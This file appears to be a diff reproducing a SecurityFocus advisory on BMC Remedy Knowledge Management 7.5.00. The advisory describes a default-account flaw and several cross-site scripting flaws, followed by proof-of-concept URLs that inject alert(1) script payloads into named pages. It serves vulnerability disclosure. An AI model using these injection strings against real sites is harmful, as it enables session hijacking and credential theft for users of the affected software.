@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/47728/info
+
+BMC Remedy Knowledge Management is prone to a default-account vulnerability and multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+Attackers can leverage the default account issue to bypass authentication and gain access without permission. Successful exploits can aid in further attacks.
+
+An attacker may leverage the cross-site scripting issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+Remedy Knowledge Management 7.5.00 is vulnerable; other versions may also be affected. 
+
+https://www.example.com/rkm/external.jsp?doc=&#039;%3balert(1)//&user=Self+Help
+https://www.example.com/rkm/search.jsp?user=Self+Help&startDate=\&#039;%3balert(1)//
+https://www.example.com/rkm/usersettings.jsp?"><script>alert(1)</script>
+https://www.example.com/rkm/viewdoc.jsp?doc=><script>alert(1)</script>&user=Self%20Help
+https://www.example.com/rkm/AttachmentServlet?="><script>alert(1)</script>
+https://www.example.com/rkm/index.jsp?user=Self%20Help
